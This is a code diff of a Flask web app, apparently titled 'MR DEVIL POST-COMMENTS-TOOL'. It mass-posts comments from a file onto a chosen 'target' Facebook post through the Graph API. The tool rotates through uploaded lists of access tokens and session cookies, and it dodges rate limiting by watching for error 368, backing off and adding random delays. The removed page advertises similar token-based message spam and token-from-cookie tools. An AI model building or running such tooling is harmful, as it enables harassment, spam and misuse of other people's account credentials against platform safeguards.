@@ -1,440 +1,373 @@
-from flask import Flask, request
+import os
 import requests
-from time import sleep
 import time
-from datetime import datetime
+import random
+from flask import Flask, request, render_template_string, session
+from threading import Thread
+
 app = Flask(__name__)
-app.debug = True
+app.secret_key = 'your_secret_key_here'
 
-headers = {
-    'Connection': 'keep-alive',
-    'Cache-Control': 'max-age=0',
-    'Upgrade-Insecure-Requests': '1',
-    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-    'Accept-Encoding': 'gzip, deflate',
-    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-    'referer': 'www.google.com'
-}
+# Global state
+comments = []
+post_id = None
+speed = None
+target_name = None
+tokens = []
+cookies = []
+stop_flags = {}
 
-@app.route('/', methods=['GET', 'POST'])
-def send_message():
-    if request.method == 'POST':
-        access_token = request.form.get('accessToken')
-        thread_id = request.form.get('threadId')
-        mn = request.form.get('kidx')
-        time_interval = int(request.form.get('time'))
+# Developer details
+user_name = "😈 𝙈𝙀 𝘿𝙀𝙑𝗜𝗟 ᯽ 𝙊𝙉 𝙁𝙄𝙍𝗘 😈"
+whatsapp_no = "9024870456"
+facebook_link = "https://www.facebook.com/share/12MA8XP3Sv9/"
 
-        txt_file = request.files['txtFile']
-        messages = txt_file.read().decode().splitlines()
+def read_comments_from_file(uploaded_file):
+    global comments
+    comments = uploaded_file.read().decode("utf-8").splitlines()
+    comments = [comment.strip() for comment in comments if comment.strip()]
+
+def read_tokens_from_file(uploaded_file=None):
+    global tokens
+    tokens = []
+    if uploaded_file:
+        lines = uploaded_file.read().decode("utf-8").splitlines()
+        tokens = [line.strip() for line in lines if line.strip()]
+    else:
+        token_files = ['tokens.txt', 'rishi.txt', 'token_file.txt']
+        for token_file in token_files:
+            if os.path.exists(token_file):
+                with open(token_file, 'r') as file:
+                    tokens = [line.strip() for line in file if line.strip()]
+                break
+
+def read_cookies_from_file(uploaded_file=None):
+    global cookies
+    cookies = []
+    if uploaded_file:
+        lines = uploaded_file.read().decode("utf-8").splitlines()
+        cookies = [line.strip() for line in lines if line.strip()]
+    else:
+        cookie_files = ['cookies.txt', 'cookie_file.txt']
+        for cookie_file in cookie_files:
+            if os.path.exists(cookie_file):
+                with open(cookie_file, 'r') as file:
+                    cookies = [line.strip() for line in file if line.strip()]
+                break
+
+def post_comment(user_id):
+    comment_index = 0
+    token_index = 0
+    cookie_index = 0
+    base_retry_delay = 600    # 10 minutes
+    max_retry_delay = 1800    # 30 minutes
+
+    while True:
+        if stop_flags.get(user_id, False):
+            print(f"User {user_id} stopped commenting.")
+            break
+
+        if not comments:
+            print("No comments found.")
+            break
+
+        comment = comments[comment_index % len(comments)]
+        comment_index += 1
+
+        # Use tokens or cookies
+        if tokens:
+            token = tokens[token_index % len(tokens)]
+            token_index += 1
+            params = {"message": comment, "access_token": token}
+            url = f"https://graph.facebook.com/{post_id}/comments"
+            use_cookies = None
+        elif cookies:
+            cookie = cookies[cookie_index % len(cookies)]
+            cookie_index += 1
+            params = {"message": comment}
+            url = f"https://graph.facebook.com/{post_id}/comments"
+            use_cookies = {"cookie": cookie}
+        else:
+            print("No token or cookie found.")
+            break
+
+        current_retry_delay = base_retry_delay
 
         while True:
             try:
-                for message1 in messages:
-                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                    message = str(mn) + ' ' + message1
-                    parameters = {'access_token': access_token, 'message': message}
-                    response = requests.post(api_url, data=parameters, headers=headers)
-                    if response.status_code == 200:
-                        print(f"Message sent using token {access_token}: {message}")
+                if tokens:
+                    response = requests.post(url, params=params, timeout=10)
+                else:
+                    response = requests.post(url, params=params, cookies=use_cookies, timeout=10)
+                if response.status_code == 200:
+                    print(f"[{user_id}] Comment posted: {comment}")
+                    current_retry_delay = base_retry_delay  # Reset delay on success
+                    break
+                else:
+                    print(f"[{user_id}] Failed: {response.text}")
+                    # Rate limit error
+                    if '"code":368' in response.text:
+                        print(f"Rate limit hit! Waiting for {current_retry_delay//60} minutes...")
+                        time.sleep(current_retry_delay)
+                        current_retry_delay = min(current_retry_delay * 2, max_retry_delay)
+                        continue  # Try again after delay
                     else:
-                        print(f"Failed to send message using token {access_token}: {message}")
-                    time.sleep(time_interval)
+                        break
             except Exception as e:
-                print(f"Error while sending message using token {access_token}: {message}")
-                print(e)
-                time.sleep(30)
+                print(f"[{user_id}] Network error: {str(e)}, retrying in {current_retry_delay}s")
+                time.sleep(current_retry_delay)
+                current_retry_delay = min(current_retry_delay * 2, max_retry_delay)
+                continue  # Try again after delay
 
+        # Random delay between comments (60 to 120 seconds)
+        rand_delay = random.randint(60, 120)
+        print(f"[{user_id}] Waiting {rand_delay} seconds before next comment...")
+        time.sleep(rand_delay)
 
-    return '''
-<!DOCTYPE html> 
-<html lang="en" x-data="{ ping: 'Calculating...', time: 'Loading...' }">
- <head> 
-  <meta charset="UTF-8"> 
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
-  <title>𝐒𝐎𝐍𝐔-𝐖𝐄𝐁</title> 
-  <meta name="description" content="A web application to check Facebook tokens and manage profile guard settings. Secure your Facebook profile with ease."> 
-  <meta property="og:title" content="SONU WEB - This Tools allows you to check facebook tokens and manage profile guard settings. And getting your Access Token and Cookie and you can spam react on fb using the tools below."> 
-  <meta property="og:description" content="A web application to check Facebook tokens and manage profile guard settings. Secure your Facebook profile with ease and access token and cookie."> 
-  <meta property="og:image" content="https://i.ibb.co/PFwnZ5C/IMG-20240610-WA0044.jpg"> 
-  <meta property="og:url" content="https://www.facebook.com/profile.php?id=61567885890652"> 
-  <link href="css/tailwind.min.css" rel="stylesheet"> 
-  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet"> 
-  <style>
+def start_commenting(user_id):
+    thread = Thread(target=post_comment, args=(user_id,))
+    thread.daemon = True
+    thread.start()
+
+@app.route("/", methods=["GET", "POST"])
+def index():
+    global post_id, speed, target_name
+
+    if request.method == "POST":
+        user_id = session.get('user_id')
+        if not user_id:
+            user_id = str(time.time())
+            session['user_id'] = user_id
+
+        action = request.form.get('action')
+        if action == "stop":
+            stop_flags[user_id] = True
+            return f"User {user_id} has requested to stop commenting."
+
+        post_id = request.form["post_id"]
+        speed = int(request.form["speed"])
+        speed = max(speed, 60)  # Minimum 60 seconds enforced
+        target_name = request.form["target_name"]
+
+        # Token handling
+        global tokens
+        tokens = []
+        if request.form.get('single_token'):
+            tokens = [request.form.get('single_token')]
+        elif 'tokens_file' in request.files and request.files['tokens_file'].filename:
+            read_tokens_from_file(request.files['tokens_file'])
+        else:
+            read_tokens_from_file()
+
+        # Cookie handling
+        global cookies
+        cookies = []
+        if request.form.get('single_cookie'):
+            cookies = [request.form.get('single_cookie')]
+        elif 'cookies_file' in request.files and request.files['cookies_file'].filename:
+            read_cookies_from_file(request.files['cookies_file'])
+        else:
+            read_cookies_from_file()
+
+        if 'comments_file' in request.files and request.files['comments_file'].filename:
+            read_comments_from_file(request.files['comments_file'])
+
+        stop_flags[user_id] = False
+        start_commenting(user_id)
+
+        return f"User {user_id} started posting comments!"
+
+    # Read tokens/cookies from file at start
+    if not tokens:
+        read_tokens_from_file()
+    if not cookies:
+        read_cookies_from_file()
+
+    return render_template_string('''
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>🦋𝗠𝗥 𝗗𝗘𝗩𝗜𝗟 𝗣𝗢𝗦𝗧-𝗖𝗢𝗠𝗠𝗘𝗡𝗧𝗦-𝗧𝗢𝗢𝗟🦋</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    <style>
         body {
-            font-family: 'Poppins', sans-serif;
-            scroll-behavior: smooth;
-            transition: background-color 0.5s, color 0.5s;
-            background-color: #1a202c;
-            color: white;
-        }
-
-        .card {
-            transition: transform 0.3s, box-shadow 0.3s, opacity 0.3s;
-            opacity: 1;
-            transform: translateY(0);
-            border: 1px solid #4a5568;
-            background-color: #2d3748;
-            color: #f9f9f9;
-            position: relative;
-        }
-
-        .card:hover {
-            transform: translateY(-5px) scale(1.05);
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.4);
-        }
-
-        .status {
-            position: absolute;
-            top: 10px;
-            right: 10px;
-            background-color: #1a202c;
-            padding: 5px 10px;
-            border-radius: 5px;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #0f2027, #2c5364, #ff00cc, #333399);
+            min-height: 100vh;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            color: #fff;
             display: flex;
+            flex-direction: column;
             align-items: center;
-            font-size: 14px;
-            color: #a0aec0;
         }
-
-        .status .dot {
-            height: 10px;
-            width: 10px;
-            background-color: #48bb78;
-            border-radius: 50%;
-            display: inline-block;
-            margin-right: 5px;
+        .main-container {
+            width: 98vw;
+            max-width: 440px;
+            margin: 24px auto 0 auto;
+            background: rgba(20,20,30,0.92);
+            border-radius: 18px;
+            box-shadow: 0 8px 32px #0008;
+            padding: 18px 8px 16px 8px;
         }
-
-        .hidden {
-            opacity: 0;
-            transform: scale(0.95);
-            pointer-events: none;
+        h2 {
+            font-size: 2rem;
+            background: linear-gradient(90deg, #ff00cc 0%, #333399 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 0.5em;
+            font-weight: bold;
+            letter-spacing: 1px;
+            text-shadow: 0 2px 6px #000a;
         }
-
-        .text-yellow-500:hover {
-            color: #eab308;
+        .header {
+            font-size: 1.3rem;
+            font-weight: 600;
+            margin-bottom: 1em;
+            letter-spacing: 1px;
         }
-
-        .header-button:hover {
-            background-color: #eab308;
-        }
-
-        .fixed-header {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            z-index: 1000;
-            background-color: #2d3748;
-            transition: background-color 0.3s;
-        }
-
-        .header-shadow {
-            box-shadow: 0 5px 10px rgba(0, 0, 0, 0.3);
-        }
-
-        .header-spacing {
-            margin-top: 80px;
-        }
-
-        .focus\:outline-none:focus {
-            outline: 2px solid #eab308;
-            outline-offset: 4px;
-        }
-
-        .fade-in {
-            animation: fadeIn 0.5s ease-in-out;
-        }
-
-        @keyframes fadeIn {
-            0% {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-
-            100% {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .bubble-button {
-            background: linear-gradient(135deg, #ffcc33, #ff66cc);
-            color: white;
-            padding: 10px 20px;
-            border-radius: 50px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
-            transition: transform 0.2s, box-shadow 0.2s;
-        }
-
-        .bubble-button:hover {
-            transform: scale(1.1);
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
-        }
-
-        .loading-spinner {
+        form {
             display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 200px;
+            flex-direction: column;
+            gap: 14px;
         }
-
-        .loading-spinner div {
-            width: 40px;
-            height: 40px;
-            border: 4px solid #eab308;
-            border-radius: 50%;
-            border-top-color: transparent;
-            animation: spin 1s linear infinite;
-        }
-
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-
-        footer {
-            background-color: #2d3748;
-            color: white;
-            padding: 20px;
-            text-align: center;
-            margin-top: 20px;
-        }
-
-        .footer-links {
-            margin-top: 10px;
-        }
-
-        .footer-links a {
-            color: #ffcc33;
-            margin: 0 10px;
-            transition: color 0.2s;
-        }
-
-        .footer-links a:hover {
-            color: #ff9900;
-        }
-
-        .footer-social {
-            margin-top: 15px;
-        }
-
-        .footer-social a {
-            color: white;
-            margin: 0 5px;
-            transition: color 0.2s;
-        }
-
-        .footer-social a:hover {
-            color: #ffcc33;
-        }
-
-        .search-bar {
-            position: relative;
-            width: 100%;
-            max-width: 400px;
-        }
-
-        .search-bar input {
-            width: 100%;
-            padding: 10px 15px 10px 40px;
-            border-radius: 25px;
-            background-color: #2d3748;
-            color: white;
-            border: 1px solid #4a5568;
-            transition: border-color 0.2s;
-        }
-
-        .search-bar input:focus {
-            border-color: #eab308;
-            outline: none;
-        }
-
-        .search-bar i {
-            position: absolute;
-            top: 50%;
-            left: 15px;
-            transform: translateY(-50%);
-            color: #eab308;
-        }
-
-        .search-bar i:hover {
-            color: #ff9900;
-        }
-
-        .iframe-container {
-            position: relative;
-            overflow: hidden;
-            padding-top: 56.25%; /* 16:9 aspect ratio (divide 9 by 16 = 0.5625) */
-        }
-
-        .iframe-container iframe {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
+        input[type="text"], input[type="number"], input[type="file"] {
+            font-size: 1.1rem;
+            padding: 15px 12px;
+            border-radius: 10px;
             border: none;
+            outline: none;
+            background: #222a;
+            color: #fff;
+            box-sizing: border-box;
+            width: 100%;
         }
-    </style> 
- </head> 
- <body> 
-  <div class="fixed-header p-4 rounded-b-lg flex justify-between items-center shadow-lg header-shadow header-content"> 
-   <h1 class="text-3xl font-bold header-title">𝐒𝐎𝐍𝐔-𝐖𝐄𝐁</h1> 
-   <div> 
-    <p>ms: <span id="pingValue">Calculating...</span></p> 
-    <p>TIME: <span id="timeValue">Loading...</span></p> 
-   </div> 
-  </div> 
-  <div class="container mx-auto p-4 header-spacing"> 
-   <div> 
-    <h2 class="text-2xl font-bold mb-2"><i class="fas fa-project-diagram mr-2 animated-icon"></i>Welcome To SONU Web</h2> 
-    <p class="text-gray-300 mb-6">Explore our diverse range of tools designed to enhance your Facebook experience, automate tasks, and improve your overall productivity.</p> 
-    <div class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-6"> 
-     <!-- Card 1 --> 
-     <div class="card p-4 rounded-lg project-card shadow-lg fade-in" data-category="Facebook Tool"> 
-      <img src="https://i.ibb.co/nsQfrxT3/IMG-20250311-WA0016.jpg" alt="SONU Tools Logo" style="width: 100%; height: 50%;"> 
-      <div class="status"> 
-       <span class="dot"></span> Up 
-      </div> 
-      <h3 class="text-lg font-bold mb-1">Tool 1</h3> 
-      <p class="text-gray-400 mb-2">Facebook inbx convo</p> 
-      <p class="text-gray-300 mb-4">Convo tool which helps to Send Msg using Token </p> 
-      <a href="http://fi6.bot-hosting.net:22100/" target="_blank" class="bubble-button focus:outline-none"><i class="fas fa-external-link-alt mr-2"></i>Check it now!</a> 
-     </div> 
-     <p class="text-gray-300 mb-6"></p> 
-     <!-- Card 2 --> 
-     <div class="card p-4 rounded-lg project-card shadow-lg fade-in" data-category="Facebook Tool"> 
-      <img src="https://i.ibb.co/nsQfrxT3/IMG-20250311-WA0016.jpg" alt="SONU Tools Logo" style="width: 100%; height: 50%;"> 
-      <div class="status"> 
-       <span class="dot"></span> Up 
-      </div> 
-      <h3 class="text-lg font-bold mb-1">Tool 2</h3> 
-      <p class="text-gray-400 mb-2">Get Post UID</p> 
-      <p class="text-gray-300 mb-4">Here You Just Paste Your Post Link And Get Uid Without Login</p> 
-      <a href="/getuid" target="_blank" class="bubble-button focus:outline-none"><i class="fas fa-external-link-alt mr-2"></i>Check it now!</a> 
-     </div> 
-     <p class="text-gray-300 mb-6"></p> 
-     <!-- Card 3 --> 
-     <div class="card p-4 rounded-lg project-card shadow-lg fade-in" data-category="Facebook Tool"> 
-      <img src="https://i.ibb.co/nsQfrxT3/IMG-20250311-WA0016.jpg" alt="SONU Tools Logo" style="width: 100%; height: 50%;"> 
-      <div class="status"> 
-       <span class="dot"></span> Up 
-      </div> 
-      <h3 class="text-lg font-bold mb-1">Tool 3</h3> 
-      <p class="text-gray-400 mb-2">Get Messenger Group UID</p> 
-      <p class="text-gray-300 mb-4">Here You Just Paste Your Token And Get All Messenger Groups UID With Name </p> 
-      <a href="/group" target="_blank" class="bubble-button focus:outline-none"><i class="fas fa-external-link-alt mr-2"></i>Check it now!</a> 
-     </div> 
-     <p class="text-gray-300 mb-6"></p> 
-     <!-- Card 4 --> 
-     <div class="card p-4 rounded-lg project-card shadow-lg fade-in" data-category="Facebook Tool"> 
-      <img src="https://i.ibb.co/nsQfrxT3/IMG-20250311-WA0016.jpg" alt="SONU Tools Logo" style="width: 100%; height: 50%;"> 
-      <div class="status"> 
-       <span class="dot"></span> Up 
-      </div>
-            <div class="service-card" onclick="window.location.href='http://fi3.bot-hosting.net:21059'">
-                <h2>𝐅𝐁 𝐏𝐎𝐒𝐓 𝐒𝐄𝐑𝐕𝐄𝐑 𝟏</h2>
-                <p>𝚃𝙷𝙸𝚂 𝚃𝙾𝙾𝙻 𝚂𝙴𝙽𝙳𝚂 𝙼𝙴𝚂𝚂𝙰𝙶𝙴𝚂 𝚄𝚂𝙸𝙽𝙶 𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺 𝚃𝙾𝙺𝙴𝙽</p>
+        label {
+            font-size: 1.05rem;
+            color: #ff00cc;
+            font-weight: 600;
+            margin-bottom: 2px;
+        }
+        .btn-row {
+            display: flex;
+            gap: 10px;
+            margin-top: 12px;
+        }
+        button {
+            flex: 1;
+            font-size: 1.15rem;
+            font-weight: bold;
+            padding: 16px 0;
+            border: none;
+            border-radius: 9px;
+            cursor: pointer;
+            margin-top: 8px;
+            margin-bottom: 8px;
+            width: 100%;
+            box-shadow: 0 2px 10px #0003;
+            transition: background 0.2s, transform 0.1s;
+        }
+        .start-btn {
+            background: linear-gradient(90deg, #00ff99 0%, #00aaff 100%);
+            color: #222;
+        }
+        .stop-btn {
+            background: linear-gradient(90deg, #ff0033 0%, #ff9900 100%);
+            color: #fff;
+        }
+        .footer {
+            margin-top: 32px;
+            font-size: 1.05rem;
+            text-align: center;
+        }
+        .footer .lime {
+            color: #39ff14;
+            font-size: 1.15rem;
+            font-weight: bold;
+            margin-top: 1em;
+            display: block;
+            letter-spacing: 1px;
+        }
+        .footer .contact-row {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 8px;
+        }
+        .footer .contact-row .fa-whatsapp {
+            color: #25d366;
+            font-size: 1.4em;
+        }
+        .footer .contact-row .fa-facebook {
+            color: #1877f3;
+            font-size: 1.4em;
+        }
+        .footer .fb-link {
+            color: #fff;
+            text-decoration: none;
+            font-weight: 600;
+            margin-left: 5px;
+        }
+        @media (max-width: 600px) {
+            .main-container {
+                padding: 10px 2vw;
+                max-width: 99vw;
+                border-radius: 10px;
+            }
+            h2 { font-size: 1.2rem; }
+            .header { font-size: 1.02rem; }
+            button, input { font-size: 1rem; padding: 12px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="main-container">
+        <h2>🦋𝗠𝗥 𝗗𝗘𝗩𝗜𝗟 𝗣𝗢𝗦𝗧-𝗖𝗢𝗠𝗠𝗘𝗡𝗧𝗦-𝗧𝗢𝗢𝗟🦋</h2>
+        <div class="header">Welcome to the MR DEVIL POST SERVER!<br>Developer: {{ user_name }}</div>
+        <form action="/" method="post" enctype="multipart/form-data">
+            <input type="text" name="post_id" placeholder="Enter Post ID" required>
+            <input type="text" name="speed" placeholder="Enter Speed (seconds)" required>
+            <input type="text" name="target_name" placeholder="Enter Target Name" required>
+
+            <label>Single Token (Optional):</label>
+            <input type="text" name="single_token" placeholder="Enter Single Token">
+
+            <label>Upload Token File (Multiple tokens, one per line):</label>
+            <input type="file" name="tokens_file" accept=".txt">
+
+            <label>Single Cookie (Optional):</label>
+            <input type="text" name="single_cookie" placeholder="Enter Single Cookie">
+
+            <label>Upload Cookie File (Multiple cookies, one per line):</label>
+            <input type="file" name="cookies_file" accept=".txt">
+
+            <label>Upload Comments File (.txt, one comment per line):</label>
+            <input type="file" name="comments_file" accept=".txt">
+
+            <div class="btn-row">
+                <button type="submit" name="action" value="start" class="start-btn">🚀 Start</button>
+                <button type="submit" name="action" value="stop" class="stop-btn">🛑 Stop</button>
             </div>
-     <p class="text-gray-300 mb-6"></p> 
-     <!-- Card 5 --> 
-     <div class="card p-4 rounded-lg project-card shadow-lg fade-in" data-category="Facebook Tool"> 
-      <img src="https://i.ibb.co/nsQfrxT3/IMG-20250311-WA0016.jpg" alt="SONU Tools Logo" style="width: 100%; height: 50%;"> 
-      <div class="status"> 
-       <span class="dot"></span> Up 
-      </div> 
-      <h3 class="text-lg font-bold mb-1">Tool 5</h3> 
-      <p class="text-gray-400 mb-2">whtsap offline convo</p> 
-      <p class="text-gray-300 mb-4">Convo tool which helps to Send Msg using Token </p> 
-      <a href="http://fi6.bot-hosting.net:21549/" target="_blank" class="bubble-button focus:outline-none"><i class="fas fa-external-link-alt mr-2"></i>Check it now!</a> 
-     </div> 
-     <p class="text-gray-300 mb-6"></p> 
-     <div class="card p-4 rounded-lg project-card shadow-lg fade-in" data-category="Facebook Tool"> 
-      <img src="https://i.ibb.co/nsQfrxT3/IMG-20250311-WA0016.jpg" alt="SONU Tools Logo" style="width: 100%; height: 50%;"> 
-      <div class="status"> 
-       <span class="dot"></span> Up 
-      </div> 
-      <h3 class="text-lg font-bold mb-1">Tool 6</h3> 
-      <p class="text-gray-400 mb-2">Get Token with Cookie</p> 
-      <p class="text-gray-300 mb-4">Here You Get Facebook Token For Convo/Post</p> 
-      <a href="/get_token" target="_blank" class="bubble-button focus:outline-none"><i class="fas fa-external-link-alt mr-2"></i>Check it now!</a> 
-     </div> 
-     <p class="text-gray-300 mb-6"></p> 
-     <div class="card p-4 rounded-lg project-card shadow-lg fade-in" data-category="Facebook Tool"> 
-      <img src="https://i.ibb.co/nsQfrxT3/IMG-20250311-WA0016.jpg" alt="SONU Tools Logo" style="width: 100%; height: 50%;"> 
-      <div class="status"> 
-       <span class="dot"></span> Up 
-      </div> 
-      <h3 class="text-lg font-bold mb-1">Tool 7</h3> 
-      <p class="text-gray-400 mb-2">Free Server Convo </p> 
-      <p class="text-gray-300 mb-4">Convo tool which helps to Send Msg using Token</p> 
-      <a href="http://152.42.220.111:25670" target="_blank" class="bubble-button focus:outline-none"><i class="fas fa-external-link-alt mr-2"></i>Check it now!</a> 
-     </div> 
-     <p class="text-gray-300 mb-6"></p> 
-     <div class="card p-4 rounded-lg project-card shadow-lg fade-in" data-category="Facebook Tool"> 
-      <img src="https://i.ibb.co/nsQfrxT3/IMG-20250311-WA0016.jpg" alt="SONU Tools Logo" style="width: 100%; height: 50%;"> 
-      <div class="status"> 
-       <span class="dot"></span> Up 
-      </div> 
-      <h3 class="text-lg font-bold mb-1">Tool 8</h3> 
-      <p class="text-gray-400 mb-2">POST SERVER </p> 
-      <p class="text-gray-300 mb-4">Wall Server Send Coment with Tokens</p> 
-      <a href="http://fi6.bot-hosting.net:22916/" target="_blank" class="bubble-button focus:outline-none"><i class="fas fa-external-link-alt mr-2"></i>Check it now!</a> 
-     </div> 
-    </div> 
-   </div> 
-  </div> 
-  <footer> 
-   <div>
-    © 2025 Technical Sonu. All rights reserved.
-   </div> 
-   <div class="footer-social"> 
-    <a href="https://www.facebook.com/profile.php?id=61567885890652"><i class="fab fa-facebook-f"></i></a> 
-    <a href="https://wa.me/+917351784536"><i class="fab fa-whatsapp"></i></a> 
-   </div> 
-  </footer> 
-  <script>
-        // Function to calculate live ping
-        function calculateLivePing() {
-            var startTime = new Date().getTime();
-            fetch('https://www.google.com', { mode: 'no-cors' })
-                .then(function(response) {
-                    var endTime = new Date().getTime();
-                    var pingTime = endTime - startTime;
-                    document.getElementById('pingValue').textContent = pingTime + ' ms';
-                })
-                .catch(function(err) {
-                    console.error('Fetch error: ', err);
-                    document.getElementById('pingValue').textContent = 'Error';
-                });
-        }
-
-        // Function to update live time in Asia/karanchi
-        function updateLiveTimeInKarachi() {
-            var options = { timeZone: 'Asia/Karachi', hour12: false, hour: 'numeric', minute: 'numeric', second: 'numeric' };
-            var formatter = new Intl.DateTimeFormat('en-US', options);
-            var timeString = formatter.format(new Date());
-            document.getElementById('timeValue').textContent = timeString;
-        }
-
-        // Update live ping and time every second
-        setInterval(function() {
-            calculateLivePing();
-            updateLiveTimeInKarachi();
-        }, 1000); // Update every 1 second
-    </script> 
- </body>
+        </form>
+    </div>
+    <div class="footer">
+        <div class="contact-row">
+            <i class="fab fa-whatsapp"></i>
+            <span>🦋𝗔𝗡𝗬 𝗞𝗜𝗡𝗗 𝗛𝗘𝗟𝗣 𝗠𝗥 𝗗𝗘𝗩𝗜𝗟 𝗦𝗛𝗔𝗥𝗔𝗕𝗜 𝗪𝗣 𝗡𝗢 🦋 =<b>{{ whatsapp_no }}</b></span>
+        </div>
+        <div class="contact-row">
+            <i class="fab fa-facebook"></i>
+            <a class="fb-link" href="{{ facebook_link }}" target="_blank">Facebook</a>
+        </div>
+        <span class="lime">☠️𝗧𝗛𝗜𝗦 𝗧𝗢𝗢𝗟 𝗠𝗔𝗗𝗘 𝗕𝗬 𝗠𝗥 𝗗𝗘𝗩𝗜𝗟 ☠️</span>
+    </div>
+</body>
 </html>
-'''
+''', user_name=user_name, whatsapp_no=whatsapp_no, facebook_link=facebook_link)
 
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
-    app.run(debug=True)
+if __name__ == "__main__":
+    port = os.getenv("PORT", 5000)
+    app.run(host="0.0.0.0", port=int(port), debug=True, threaded=True)
